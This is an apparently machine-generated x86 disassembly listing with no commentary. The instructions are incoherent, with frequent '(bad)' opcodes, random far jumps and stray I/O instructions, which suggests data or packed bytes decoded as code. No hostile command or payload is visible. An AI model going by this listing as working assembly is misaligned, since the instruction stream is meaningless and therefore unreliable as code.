  415ba4:	sub    BYTE PTR [edi],0x33
  415ba7:	add    BYTE PTR [edi+0x62aac9df],0x90
  415bae:	inc    edi
  415baf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415bb0:	xor    eax,0xcc45fd7c
  415bb5:	ja     0x415b72
  415bb7:	popa   
  415bb8:	cmp    al,BYTE PTR [ecx-0x2]
  415bbb:	(bad)  
  415bbc:	daa    
  415bbd:	pusha  
  415bbe:	sahf   
  415bbf:	ins    DWORD PTR es:[edi],dx
  415bc0:	dec    eax
  415bc1:	jo     0x415b92
  415bc3:	inc    eax
  415bc4:	sbb    eax,0x96f292d4
  415bc9:	mov    al,0x0
  415bcb:	mov    edi,0xd0fd7de8
  415bd0:	xchg   ecx,eax
  415bd1:	mov    DWORD PTR [esi-0x742025c8],ebx
  415bd7:	call   0x413ddf55
  415bdc:	and    BYTE PTR [esi+0x37001c00],bh
  415be2:	mov    ebp,0x7386ef7d
  415be7:	and    bl,BYTE PTR [ebx+0x2f6f8df]
  415bed:	daa    
  415bee:	rcl    DWORD PTR es:[edi+0x67],cl
  415bf2:	jecxz  0x415ba4
  415bf4:	scas   al,BYTE PTR es:[edi]
  415bf5:	pop    edi
  415bf6:	jecxz  0x415c3d
  415bf8:	mov    dl,BYTE PTR [ecx]
  415bfa:	inc    esi
  415bfb:	cmp    eax,0x9036df69
  415c00:	adc    bl,BYTE PTR [eax+0x19]
  415c03:	lods   eax,DWORD PTR ds:[esi]
  415c04:	daa    
  415c05:	sar    ah,0x14
  415c08:	mov    ebp,0x3dc2501d
  415c0d:	xor    BYTE PTR [ecx+0x328121bd],cl
  415c13:	inc    edi
  415c14:	xchg   edx,eax
  415c15:	int    0x93
  415c17:	enter  0x42fe,0xf7
  415c1b:	clc    
  415c1c:	jmp    0x9bdc:0x9a538ffe
  415c23:	pop    edi
  415c24:	pop    ebx
  415c25:	xchg   edi,eax
  415c26:	shr    BYTE PTR [ecx],cl
  415c28:	sti    
  415c29:	aaa    
  415c2a:	xchg   eax,ecx
  415c2c:	into   
  415c2d:	adc    BYTE PTR [ebx],cl
  415c2f:	cwde   
  415c30:	mov    al,0x90
  415c32:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415c33:	aas    
  415c34:	mov    ds:0x5000fd21,eax
  415c39:	sub    al,0x3c
  415c3b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415c3c:	and    BYTE PTR [ebx],bl
  415c3e:	mov    ecx,0x7c7be8cb
  415c43:	(bad)  
  415c44:	pop    ecx
  415c45:	push   0x9247d57d
  415c4a:	inc    bl
  415c4c:	fwait
  415c4d:	test   DWORD PTR [eax-0x4dc1ae44],ebx
  415c53:	push   0x27
  415c55:	sub    BYTE PTR [ebx],0xc8
  415c58:	push   ss
  415c59:	outs   dx,BYTE PTR ds:[esi]
  415c5a:	jno    0x415c6e
  415c5c:	push   ebx
  415c5d:	shl    al,cl
  415c5f:	fldpi  
  415c61:	pop    ss
  415c62:	cwde   
  415c63:	rcr    edi,1
  415c65:	test   DWORD PTR [ebx+0x34],0x6057d47f
  415c6c:	mov    al,0x38
  415c6e:	jge    0x415cb9
  415c70:	(bad)  
  415c71:	bound  edx,QWORD PTR [ebx]
  415c73:	gs jmp 0x415c6a
  415c76:	jo     0x415cbc
  415c78:	dec    esp
  415c79:	pushf  
  415c7a:	jnp    0x415ca1
  415c7c:	push   ds
  415c7d:	shl    BYTE PTR [esi-0x38],1
  415c80:	mov    BYTE PTR [edi-0x6061d0ef],ch
  415c86:	lods   eax,DWORD PTR ds:[esi]
  415c87:	les    ecx,FWORD PTR [edi]
  415c89:	sti    
  415c8a:	cld    
  415c8b:	xchg   ebx,eax
  415c8c:	fild   WORD PTR [ebx+edx*1+0x37]
  415c90:	mov    eax,0xece21a1c
  415c95:	jg     0x415c94
  415c97:	retf   
  415c98:	mov    ch,0x9a
  415c9a:	push   esi
  415c9b:	shr    BYTE PTR ds:0x6097e106,cl
  415ca1:	fiadd  WORD PTR [ebx-0x7f]
  415ca4:	(bad)  
  415ca5:	xor    DWORD PTR [edi+0x27],ebp
  415ca8:	mov    eax,ebp
  415caa:	mov    al,0xc8
  415cac:	push   ds
  415cad:	xlat   BYTE PTR ds:[ebx]
  415cae:	add    DWORD PTR [edx],eax
  415cb0:	ins    BYTE PTR es:[edi],dx
  415cb1:	sahf   
  415cb2:	aaa    
  415cb3:	inc    ebp
  415cb4:	jmp    0x415c78
  415cb6:	mov    esi,0x540bea1b
  415cbb:	or     eax,0xd5eedfce
  415cc0:	mov    ebx,DWORD PTR [edi+0x3049cc70]
  415cc6:	lahf   
  415cc7:	push   ebx
  415cc8:	add    BYTE PTR [eax-0x57944286],bh
  415cce:	mov    dl,0xe3
  415cd0:	xchg   esi,eax
  415cd1:	shl    DWORD PTR [edx-0x38],1
  415cd4:	or     edx,DWORD PTR [ecx-0x3e]
  415cd7:	pop    ebx
  415cd8:	mov    bl,0xfb
  415cda:	adc    al,0x23
  415cdc:	jmp    0x415cfd
  415cde:	fldenv [ebp-0xdf54b11]
  415ce4:	in     eax,dx
  415ce5:	fistp  WORD PTR [eax+edx*1]
  415ce8:	jb     0x415d54
  415cea:	ror    BYTE PTR [ebp+0x45fd6f88],0xe3
  415cf1:	adc    BYTE PTR [edi],0x95
  415cf4:	sbb    ebp,esi
  415cf6:	dec    ebp
  415cf7:	(bad)  
  415cf8:	fnstcw WORD PTR [eax+0x488d2014]
  415cfe:	jge    0x415d22
  415d00:	push   cs
  415d01:	inc    esp
  415d02:	and    al,0xc8
  415d04:	push   ebx
  415d05:	push   ss
  415d06:	call   0xeb48:0xbd8a595c
  415d0d:	mov    cl,0xf9
  415d0f:	ss (bad) 
  415d11:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415d12:	cli    
  415d13:	mov    ?,WORD PTR [eax+ecx*1-0x33]
  415d17:	mov    ebx,gs
  415d19:	push   ss
  415d1a:	in     al,0xeb
  415d1c:	ror    DWORD PTR ds:0xf7ecc251,1
  415d22:	popf   
  415d23:	mov    eax,ds:0xe6bf5dab
  415d28:	aas    
  415d29:	(bad)  [edx]
  415d2b:	enter  0x6ae2,0x75
  415d2f:	sbb    dh,BYTE PTR [ebp+0xa]
  415d32:	test   eax,0xe520ebc2
  415d37:	mov    esp,0x4ad1fec6
  415d3c:	iret   
  415d3d:	fild   WORD PTR [eax-0x1796228c]
  415d43:	int    0x99
  415d45:	push   es
  415d46:	std    
  415d47:	not    DWORD PTR ds:0x60831944
  415d4d:	in     al,0xe4
  415d4f:	mov    dh,0x1f
  415d51:	hlt    
  415d52:	push   edi
  415d53:	into   
  415d54:	sbb    al,0x8b
  415d56:	pop    ebp
  415d57:	sub    al,0xe0
  415d59:	sub    DWORD PTR [edi-0x1a2c17e7],esp
  415d5f:	sub    eax,0x42bd62e2
  415d64:	sahf   
  415d65:	sbb    DWORD PTR [eax],ebx
  415d67:	rcl    DWORD PTR [eax-0x14e9fc2b],1
  415d6d:	stos   BYTE PTR es:[edi],al
  415d6e:	push   ds
  415d6f:	dec    ebp
  415d70:	mov    eax,ds:0x8877e206
  415d75:	fistp  WORD PTR [esi+0x22]
  415d78:	jge    0x415cff
  415d7a:	scas   eax,DWORD PTR es:[edi]
  415d7b:	mov    edx,0x9227df63
  415d80:	(bad)  
  415d82:	sbb    al,0xc3
  415d84:	xchg   ebp,eax
  415d85:	jo     0x415d84
  415d87:	sbb    cl,BYTE PTR [ebp-0x5fca4aa2]
  415d8d:	adc    BYTE PTR [eax+ecx*8-0x6bf5ce20],ah
  415d94:	or     cl,BYTE PTR [ebp+0xf63729b]
  415d9a:	pop    ebp
  415d9b:	scas   eax,DWORD PTR es:[edi]
  415d9c:	jp     0x415dad
  415d9e:	std    
  415d9f:	in     eax,0xfe
  415da1:	push   esi
  415da3:	cs das 
  415da5:	and    BYTE PTR [eax+0x3a878ccb],bh
  415dab:	cli    
  415dac:	xor    eax,0x8379ad53
  415db1:	mov    bh,0xfc
  415db3:	mov    dh,0x18
  415db5:	fsubr  DWORD PTR [ecx]
  415db7:	cs repz (bad) 
  415dba:	mov    edi,0xf13265c8
  415dbf:	cmp    dl,BYTE PTR [esi-0x169d4708]
  415dc5:	int    0xed
  415dc7:	dec    esi
  415dc8:	hlt    
  415dc9:	sbb    DWORD PTR [ecx+0x29],0x5aacbdb3
  415dd0:	arpl   di,bx
  415dd2:	rcr    DWORD PTR [edi-0x54a1c44b],0x8f
  415dd9:	icebp  
  415dda:	and    dl,BYTE PTR [ecx]
  415ddc:	out    dx,al
  415ddd:	call   DWORD PTR [edx-0x3ea0d7e7]
  415de3:	dec    edi
  415de4:	rcl    DWORD PTR [ebp-0x2a],1
  415de7:	(bad)  
  415de8:	mov    esp,0x8a84b1a4
  415ded:	add    al,0x8e
  415def:	ins    DWORD PTR es:[edi],dx
  415df0:	jmp    0x415de1
  415df2:	fdiv   DWORD PTR [eax+0x275eb9a4]
  415df8:	(bad)  
  415df9:	fstp   st(2)
  415dfb:	int    0xe7
  415dfd:	cwde   
  415dfe:	ror    BYTE PTR ds:0x370660ab,0xeb
  415e05:	ja     0x415e0c
  415e07:	inc    edx
  415e08:	adc    ecx,ebp
  415e0a:	xchg   edi,eax
  415e0b:	or     DWORD PTR [eax-0x21],ebx
  415e0e:	jns    0x415e28
  415e10:	xor    al,0xa6
  415e12:	dec    ecx
  415e13:	inc    eax
  415e14:	push   eax
  415e15:	pop    ebp
  415e16:	std    
  415e17:	(bad)  
  415e18:	out    0x56,eax
  415e1a:	fidiv  WORD PTR [edx-0x3762be3a]
  415e20:	int    0xaf
  415e22:	push   ebp
  415e23:	outs   dx,DWORD PTR ds:[esi]
  415e24:	push   esi
  415e25:	(bad)  
  415e26:	inc    ebp
  415e28:	jmp    0x8849:0xca9edabc
  415e2f:	cmp    BYTE PTR [edx+0x5d],al
  415e32:	daa    
  415e33:	rcl    DWORD PTR [esi],cl
  415e35:	sbb    DWORD PTR [ecx+esi*4-0x448fc915],eax
  415e3c:	jo     0x415dcd
  415e3e:	std    
  415e3f:	mov    ebp,0x710175b7
  415e44:	inc    edi
  415e45:	xchg   esp,eax
  415e46:	cmp    al,0xc8
  415e48:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415e49:	icebp  
  415e4a:	fsubr  st,st(5)
  415e4c:	rol    DWORD PTR [ebx+0x0],0xd5
  415e50:	fidivr WORD PTR [eax]
  415e52:	ror    ecx,0xcf
  415e55:	cmp    eax,DWORD PTR [ecx-0x6f551e88]
  415e5b:	mov    ebx,0xd756dfac
  415e60:	mov    edi,0x70049980
  415e65:	adc    ah,cl
  415e67:	int3   
  415e68:	aas    
  415e69:	pop    edi
  415e6a:	and    BYTE PTR [ebp-0x50],0xae
  415e6e:	xchg   ecx,eax
  415e6f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415e70:	call   0x1bc6:0x5e82addc
  415e77:	out    dx,al
  415e78:	adc    al,0x2f
  415e7a:	and    DWORD PTR [esi+eiz*2],esp
  415e7d:	cmp    eax,0xb1ee2ffd
  415e82:	mov    bl,BYTE PTR [ebp-0x38112399]
  415e88:	retf   0xe5ab
  415e8b:	scas   al,BYTE PTR es:[edi]
  415e8c:	mov    dh,0xe3
  415e8e:	mov    eax,ds:0x720ae639
  415e93:	push   edx
  415e94:	sti    
  415e95:	and    cl,BYTE PTR ds:0x5ea1a765
  415e9b:	or     ah,0xcb
  415e9e:	stc    
  415e9f:	mov    eax,ds:0x87f092c
  415ea4:	sub    eax,0xeb20d158
  415ea9:	int    0x8c
  415eab:	pushf  
  415eac:	and    ah,dh
  415eae:	cdq    
  415eaf:	retf   
  415eb0:	test   edi,ebx
  415eb2:	push   edi
  415eb3:	inc    eax
  415eb4:	sub    DWORD PTR [edx+0x6b],esp
  415eb7:	and    al,0x2b
  415eb9:	inc    eax
  415eba:	std    
  415ebb:	mov    eax,0x7a098a50
  415ec0:	sti    
  415ec1:	fwait
  415ec2:	pusha  
  415ec3:	enter  0x9896,0xd4
  415ec7:	adc    ah,BYTE PTR [esi+0x3b]
  415eca:	push   esp
  415ecb:	pushf  
  415ecc:	jmp    0x415ec4
  415ece:	test   al,0xe1
  415ed0:	dec    edx
  415ed1:	xor    eax,DWORD PTR [ebx-0x18237ec8]
  415ed7:	cwde   
  415ed8:	cmp    eax,0x7b8abe95
  415edd:	and    BYTE PTR [edx-0x4ec00649],dh
  415ee3:	in     al,0xea
  415ee5:	cdq    
  415ee6:	(bad)  
  415ee7:	jbe    0x415e84
  415ee9:	pop    ds
  415eea:	ss pushf 
  415eec:	aas    
  415eed:	cmp    DWORD PTR [edx],edi
  415eef:	push   ss
  415ef0:	push   cs
  415ef1:	sti    
  415ef2:	adc    bh,BYTE PTR [esi-0x21]
  415ef5:	ffreep st(2)
  415ef7:	(bad)  
  415ef8:	jbe    0x415ebb
  415efa:	xchg   DWORD PTR [ebp+ebx*8+0x1a],esi
  415efe:	mov    esi,0x5b9079c8
  415f03:	mov    al,ds:0xca99eff5
  415f08:	sub    ah,al
  415f0a:	push   ebx
  415f0b:	(bad)  
  415f0c:	rcl    BYTE PTR [esp+ebp*1-0x58],cl
  415f10:	dec    edx
  415f11:	and    edi,ecx
  415f13:	(bad)  
  415f14:	pop    ebx
  415f15:	inc    ebx
  415f16:	mov    WORD PTR [ecx-0x2f],ss
  415f19:	inc    edx
  415f1a:	test   DWORD PTR [edi+edi*4],esi
  415f1d:	(bad)  
  415f1f:	enter  0x80fe,0xbe
  415f23:	repz addr16 in al,0xae
  415f27:	enter  0x3a62,0x3a
  415f2b:	push   0xe
  415f2d:	jo     0x415f16
  415f2f:	and    ebp,ebx
  415f31:	aad    0x61
  415f33:	adc    BYTE PTR [ebp-0x10],al
  415f36:	outs   dx,BYTE PTR ds:[esi]
  415f37:	dec    esp
  415f38:	push   es
  415f39:	fbld   TBYTE PTR [edx-0x28c1c3f9]
  415f3f:	jecxz  0x415eea
  415f41:	cmp    eax,0x5faa8be6
  415f46:	test   al,0xa2
  415f48:	xor    al,0x1c
  415f4a:	dec    DWORD PTR [eax+0x55]
  415f4d:	fisttp WORD PTR [esi+ebx*8]
  415f50:	or     edi,edi
  415f52:	cmp    DWORD PTR [edx+ebp*8-0x67e10c6a],esp
  415f59:	repnz push eax
  415f5b:	mov    DWORD PTR [edx+0x1f941e63],esp
  415f61:	clc    
  415f62:	sbb    eax,ecx
  415f64:	pop    edx
  415f65:	rcr    dl,1
  415f67:	call   0xdca0:0x144c6179
  415f6e:	add    DWORD PTR [ebp-0x73],esi
  415f71:	aaa    
  415f72:	cmp    eax,0xdeeff282
  415f77:	and    DWORD PTR [ebx*8-0x43b8b5f5],edx
  415f7e:	je     0x415f29
  415f80:	cwde   
  415f81:	pop    edi
  415f82:	push   ecx
  415f83:	icebp  
  415f84:	ins    DWORD PTR es:[edi],dx
  415f85:	inc    esp
  415f86:	cmc    
  415f87:	(bad)  
  415f88:	cwde   
  415f89:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415f8a:	adc    eax,0x2f29292f
  415f8f:	retf   
  415f90:	stc    
  415f91:	js     0x415f64
  415f93:	mov    ebx,0xc53c6feb
  415f98:	pop    esi
  415f99:	daa    
  415f9a:	(bad)  
  415f9b:	mov    ebp,0x76e0ff6
  415fa0:	arpl   WORD PTR [ebp+0x50da1843],sp
  415fa6:	js     0x415f40
  415fa8:	out    dx,al
  415fa9:	in     al,dx
  415faa:	sbb    bl,BYTE PTR [esi+0x133f7fdd]
  415fb0:	mov    ecx,0xd7c897de
  415fb5:	pop    es
  415fb6:	fidivr DWORD PTR [esi+0xc91961a]
  415fbc:	mov    al,ds:0xa4ffcfe
  415fc1:	xchg   DWORD PTR [ebx],ecx
  415fc3:	mov    ah,0xf8
  415fc5:	push   0xffffff89
  415fc7:	enter  0xdfb,0x6d
  415fcb:	xor    eax,0x6f3f643a
  415fd0:	or     eax,DWORD PTR [edx]
  415fd2:	std    
  415fd3:	xchg   edi,eax
  415fd4:	pop    esi
  415fd5:	int    0xac
  415fd7:	mov    ecx,DWORD PTR [eax+ecx*2]
  415fda:	rol    bh,cl
  415fdc:	outs   dx,BYTE PTR ds:[esi]
  415fdd:	jmp    0x415f9e
  415fdf:	shl    DWORD PTR [edi],0xb2
  415fe2:	ins    DWORD PTR es:[edi],dx
  415fe3:	sub    ebx,0x2f3fb8b6
  415fe9:	or     ecx,edx
  415feb:	pusha  
  415fec:	into   
  415fed:	fistp  WORD PTR ds:0xf52fa75d
  415ff3:	xor    ecx,ebx
  415ff5:	adc    BYTE PTR [ebp+0x4c],al
  415ff8:	rcr    bh,cl
  415ffa:	div    esi
  415ffc:	push   ds
  415ffd:	sub    BYTE PTR [eax-0x36],bh
  416000:	xchg   esi,eax
  416001:	fisttp WORD PTR [esi+0x7d38ea3e]
  416007:	sub    eax,esi
  416009:	dec    ebx
  41600a:	xor    eax,0x7edee58e
  41600f:	push   edx
  416010:	pop    ecx
  416011:	jecxz  0x41607b
  416013:	mov    eax,ds:0xc8019b1f
  416018:	inc    ebp
  416019:	push   0xd75a6ed0
  41601e:	shl    BYTE PTR [ebp-0x38256a3d],cl
  416024:	sub    esp,ecx
  416026:	dec    esi
  416027:	dec    edx
  416028:	push   0x94ce2d82
  41602d:	inc    edi
  41602e:	jl     0x4160ad
  416030:	or     esi,DWORD PTR [eax+0x39]
  416033:	fild   WORD PTR [ecx-0x4ba8f123]
  416039:	popf   
  41603a:	cld    
  41603b:	inc    edi
  41603c:	xor    ecx,0xffffffc6
  41603f:	call   FWORD PTR [ebx-0x20]
  416042:	es jno 0x415fff
  416045:	mov    ebx,DWORD PTR [eax-0x48]
  416048:	lock jnp 0x41605d
  41604b:	cwde   
  41604c:	jmp    0x4b85:0x17db3dfa
  416053:	sub    BYTE PTR [ecx],cl
  416055:	push   edi
  416056:	ret    0x7c9
  416059:	popf   
  41605a:	daa    
  41605b:	xchg   ebp,eax
  41605c:	lock jle 0x416030
  41605f:	out    0x8c,eax
  416061:	xchg   ebp,eax
  416062:	rsqrtps xmm2,XMMWORD PTR [eax]
  416065:	jg     0x416065
  416067:	fcomp  QWORD PTR [edi]
  416069:	cmp    edx,eax
  41606b:	cdq    
  41606c:	loop   0x4160ed
  41606e:	and    esi,DWORD PTR [ebp-0x16]
  416071:	das    
  416072:	sar    DWORD PTR [ecx+0x49],1
  416075:	iret   
  416076:	fdivr  DWORD PTR [edi]
  416078:	rcr    esi,cl
  41607a:	pop    edx
  41607b:	enter  0x77c0,0xff
  41607f:	xchg   DWORD PTR [edx-0x14d2eb4e],eax
  416085:	lds    esi,FWORD PTR [eax+0x1e]
  416088:	cld    
  416089:	in     al,0x3
  41608b:	mulps  xmm3,xmm7
  41608e:	dec    edi
  41608f:	fnstcw WORD PTR [edx]
  416091:	push   ds
  416092:	dec    esi
  416093:	cdq    
  416094:	adc    esi,DWORD PTR [eax]
  416096:	std    
  416097:	inc    esp
  416098:	or     cl,BYTE PTR [edi+eax*8+0x57]
  41609c:	jae    0x41607c
  41609e:	jl     0x416068
  4160a0:	dec    ebx
  4160a1:	pop    ecx
  4160a2:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  4160a4:	test   DWORD PTR ds:0xafeb0d2a,eax
  4160aa:	cmp    al,0xd8
  4160ac:	scas   eax,DWORD PTR es:[edi]
  4160ad:	mov    cl,BYTE PTR [esp+0x66]
  4160b1:	fwait
  4160b2:	xor    bh,BYTE PTR [esi+0x4db034eb]
  4160b8:	(bad)  
  4160b9:	xlat   BYTE PTR ds:[ebx]
  4160ba:	xchg   ebp,eax
  4160bb:	cs jmp 0x416060
  4160be:	sahf   
  4160bf:	popf   
  4160c0:	shl    BYTE PTR [ebx-0x23f707b6],1
  4160c6:	dec    esp
  4160c7:	pop    edx
  4160c8:	xchg   ebp,eax
  4160c9:	add    BYTE PTR [ecx+ecx*4],0x3b
  4160cd:	add    eax,0x52ebf08c
  4160d2:	iret   
  4160d3:	sub    esp,eax
  4160d5:	lock dec edx
  4160d7:	jp     0x416074
  4160d9:	fistp  QWORD PTR [esi+eax*1+0x7b]
  4160dd:	fidiv  WORD PTR [esi-0xc29d341]
  4160e3:	or     ecx,DWORD PTR [eax-0x6b7daf5]
  4160e9:	mov    al,0x4
  4160eb:	or     edx,0xffffffdf
  4160ee:	sar    DWORD PTR [edx-0x3],cl
  4160f1:	cli    
  4160f2:	sub    bl,bh
  4160f4:	call   0xc15e27
  4160f9:	lahf   
  4160fa:	mov    dh,0x1d
  4160fc:	test   eax,0x37dd04f0
  416101:	or     edi,esi
  416103:	cmc    
  416104:	fcmovu st,st(1)
  416106:	mov    ecx,DWORD PTR [esi+0x18]
  416109:	and    BYTE PTR [ebp-0x2750dd0],dh
  41610f:	mov    cl,0x66
  416111:	or     bl,dl
  416113:	and    eax,ebx
  416115:	pop    ss
  416116:	or     ecx,edi
  416118:	jl     0x4160b0
  41611a:	es stos WORD PTR es:[edi],ax
  41611d:	outs   dx,DWORD PTR ds:[esi]
  41611e:	or     DWORD PTR [esi],ebx
  416120:	ds sub bh,al
  416123:	cmp    eax,0x485bf9ab
  416128:	push   es
  416129:	push   eax
  41612a:	fidiv  DWORD PTR [ebx+0x35]
  41612d:	jecxz  0x41619c
  41612f:	and    dl,ch
  416131:	int    0x87
  416133:	or     BYTE PTR [ecx],dh
  416135:	push   ebp
  416136:	cli    
  416137:	js     0x41611f
  416139:	enter  0x1544,0x24
  41613d:	inc    edx
  41613e:	mov    ebp,0x7344a08a
  416143:	enter  0xc07,0xa3
  416147:	mov    esi,0xa164f037
  41614c:	out    0x1c,al
  41614e:	mov    esi,0x3dcd5bb8
  416153:	cmc    
  416154:	mov    ecx,0x45282d72
  416159:	ffreep st(5)
  41615b:	cmp    esi,DWORD PTR [edi]
  41615d:	lahf   
  41615e:	jge    0x41616a
  416160:	arpl   WORD PTR [ebp-0x5b],dx
  416163:	stc    
  416164:	jmp    0x416159
  416166:	cmp    BYTE PTR [ebx-0x31cab670],bl
  41616c:	leave  
  41616d:	(bad)  
  41616f:	fsubr  QWORD PTR [esi-0x568b084c]
  416175:	lahf   
  416176:	cld    
  416177:	pop    ss
  416178:	cdq    
  416179:	cmp    al,BYTE PTR [eax+0x24]
  41617c:	cli    
  41617d:	bnd jbe 0x4161ae
  416180:	inc    ecx
  416181:	pop    es
  416182:	and    esp,ebx
  416184:	imul   ebp,ebp,0xffffff8f
  416187:	fld    TBYTE PTR [ecx-0x2e]
  41618a:	daa    
  41618b:	dec    ecx
  41618c:	loopne 0x4161a6
  41618e:	ret    0x48
  416191:	(bad)  
  416193:	aam    0x7
  416195:	retf   0xc79c
  416198:	lock mov bh,0xed
  41619b:	cmp    DWORD PTR [edi+edi*1+0x60],ebx
  41619f:	js     0x416216
  4161a1:	popf   
  4161a2:	pandn  mm0,QWORD PTR [ebx-0x43]
  4161a6:	cld    
  4161a7:	cmc    
  4161a8:	loop   0x416190
  4161aa:	dec    ecx
  4161ab:	push   cs
  4161ac:	cdq    
  4161ad:	jmp    0x2fec:0x1f9c34e2
  4161b4:	je     0x416198
  4161b6:	cmp    eax,0xf71fe892
  4161bb:	pop    eax
  4161bc:	arpl   WORD PTR cs:[ebp-0xd],di
  4161c0:	out    0x49,al
  4161c2:	jmp    0x896a:0x34b6f2c7
  4161c9:	and    esi,ebp
  4161cb:	pop    es
  4161cc:	jmp    0xf078:0x43919488
  4161d3:	addr16 xchg edi,eax
  4161d5:	adc    al,0xa5
  4161d7:	enter  0x3c8f,0xe5
  4161db:	push   ebx
  4161dc:	fild   WORD PTR ds:0x3eebb3ce
  4161e2:	aaa    
  4161e3:	jmp    0x9c5fa4be
  4161e8:	lea    esi,ds:0x2c66cdd3
  4161ee:	shl    BYTE PTR [ebx+0x4b],0x75
  4161f2:	imul   eax,DWORD PTR [ebx],0xffffffbc
  4161f5:	cmp    ecx,edi
  4161f7:	adc    ecx,DWORD PTR [edx-0x64]
  4161fa:	lea    ebp,fs:[ebx-0x1a]
  4161fe:	fisttp WORD PTR [edx+ebp*8-0x5]
  416202:	fsubr  st(0),st
  416204:	xor    al,0x7
  416206:	jge    0x41624c
  416208:	adc    BYTE PTR [edx+edi*8],0x8b
  41620c:	xchg   esp,eax
  41620d:	or     bh,ch
  41620f:	adc    eax,0xa285aa80
  416214:	fdivr  QWORD PTR [ecx-0x17313817]
  41621a:	sub    al,BYTE PTR [ecx]
  41621c:	daa    
  41621d:	popf   
  41621e:	pop    edx
  41621f:	popa   
  416220:	jmp    0x41625d
  416222:	ret    0x669b
  416225:	inc    eax
  416226:	loopne 0x41627a
  416228:	dec    ecx
  416229:	fcomip st,st(0)
  41622b:	in     eax,0x2b
  41622d:	sti    
  41622e:	xor    al,0x2f
  416230:	adc    BYTE PTR [eax+0x4f7661fd],dl
  416236:	sub    BYTE PTR [ecx-0x5e63db49],0x65
  41623d:	loopne 0x416247
  41623f:	retf   
  416240:	mov    esp,0x2b3e7902
  416245:	loopne 0x41627d
  416247:	jo     0x4161dc
  416249:	xchg   edx,eax
  41624a:	std    
  41624b:	xchg   esp,eax
  41624c:	std    
  41624d:	push   ds
  41624e:	stos   BYTE PTR es:[edi],al
  41624f:	ss mov ecx,0x2199f561
  416255:	fcomp  DWORD PTR [ebx]
  416257:	cs iret 
  416259:	pop    cx
  41625b:	mov    bh,0x7c
  41625d:	pop    edi
  41625e:	xor    bl,al
  416260:	cmp    eax,DWORD PTR [eax]
  416262:	std    
  416263:	into   
  416264:	add    DWORD PTR [edx+0x17],ebx
  416267:	js     0x416286
  416269:	iret   
  41626a:	jp     0x416290
  41626c:	ret    0xa8df
  41626f:	inc    eax
  416270:	mov    DWORD PTR [esi],ecx
  416272:	loopne 0x416297
  416274:	dec    ecx
  416275:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416276:	sti    
  416277:	rol    BYTE PTR [ebx+0x5e],0x25
  41627b:	and    DWORD PTR [eax+ebx*4+0x5f1ebb65],ecx
  416282:	jl     0x4162d8
  416284:	push   ecx
  416285:	fild   QWORD PTR [ebp-0x5945ce6d]
  41628b:	add    BYTE PTR [eax+0x5d],dh
  41628e:	std    
  41628f:	(bad)  
  416290:	lock jns 0x416225
  416293:	ins    DWORD PTR es:[edi],dx
  416294:	cmp    eax,0xcb2296af
  416299:	jmp    0xdf6db2cf
  41629e:	sub    eax,0x6be47dc2
  4162a3:	pop    ebp
  4162a4:	jmp    0x4162bb
  4162a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4162a7:	push   0x7178d525
  4162ac:	(bad)
  4162af:	div    BYTE PTR [edx]
  4162b1:	out    dx,al
  4162b2:	and    eax,0xfcc253dd
  4162b7:	cld    
  4162b8:	clc    
  4162b9:	das    
  4162ba:	popf   
  4162bb:	inc    edi
  4162bc:	cmc    
  4162bd:	pop    edi
  4162be:	fcmovb st,st(4)
  4162c0:	lock push 0x5f39ca4a
  4162c6:	sar    DWORD PTR [eax+ecx*4+0x198bfd7b],0xe5
  4162ce:	jg     0x41630a
  4162d0:	dec    eax
  4162d1:	cmp    ebx,eax
  4162d3:	jmp    0x416329
  4162d5:	adc    BYTE PTR [eax+0x37df33e4],al
  4162db:	jo     0x41625f
  4162dd:	push   ss
  4162de:	shl    bh,1
  4162e0:	sub    esp,ebx
  4162e2:	cdq    
  4162e3:	dec    edi
  4162e4:	call   0x3111f92
  4162e9:	shr    DWORD PTR [ebx+ebp*8],0xb
  4162ed:	lods   al,BYTE PTR ds:[esi]
  4162ee:	cs xchg esp,eax
  4162f0:	and    DWORD PTR [esi-0x6780a703],eax
  4162f6:	in     al,dx
  4162f7:	aam    0x41
  4162f9:	cli    
  4162fa:	or     BYTE PTR [eax-0xc02d30c],al
  416300:	jns    0x4162cd
  416302:	pop    edi
  416303:	fdiv   QWORD PTR [ecx]
  416305:	mov    ch,bh
  416307:	xor    eax,0x44ad8d0f
  41630c:	and    bl,al
  41630e:	ffree  st(6)
  416310:	out    dx,eax
  416311:	stos   DWORD PTR es:[edi],eax
  416312:	xor    DWORD PTR [ebp+0xbc6ef05],ebx
  416318:	or     ch,BYTE PTR [edx-0x5ac11e04]
  41631e:	mov    edx,0xf9610b29
  416323:	fld    TBYTE PTR [ebx-0x30270353]
  416329:	adc    BYTE PTR [ebx+0x4a],ch
  41632c:	sub    ebp,ebx
  41632e:	cld    
  41632f:	retf   
  416330:	retf   0x4023
  416333:	ror    BYTE PTR [eax-0x7d379189],cl
  416339:	or     BYTE PTR [edi+ecx*1],bl
  41633c:	ins    BYTE PTR es:[edi],dx
  41633d:	xor    eax,0x14eb0848
  416342:	shl    BYTE PTR [edi],1
  416344:	xor    ebx,DWORD PTR [esi]
  416346:	adc    ebx,0xffffffb7
  416349:	(bad)  
  41634b:	sbb    eax,0x1c0cc766
  416350:	add    bl,dl
  416352:	push   cs
  416353:	test   eax,0x2effb939
  416358:	sbb    DWORD PTR [edx+0x250d2021],edx
  41635e:	add    al,0xc8
  416360:	sbb    BYTE PTR [eax-0x482708ea],cl
  416366:	inc    esi
  416367:	xor    ch,bl
  416369:	push   ss
  41636a:	xor    BYTE PTR [edi+edx*4],ch
  41636d:	ret    
  41636e:	jae    0x4163d5
  416370:	outs   dx,DWORD PTR ds:[esi]
  416371:	fild   WORD PTR [edi]
  416373:	(bad)  
  416374:	addr16 jmp 0x4163ac
  416377:	fsub   QWORD PTR [eax+0x59aceccd]
  41637d:	or     eax,DWORD PTR [ebp-0x22233a57]
  416383:	or     ebp,DWORD PTR [esi-0x4b]
  416386:	pop    ebx
  416387:	sub    al,BYTE PTR [ebx+0x9]
  41638a:	push   ecx
  41638b:	pop    ss
  41638c:	cmc    
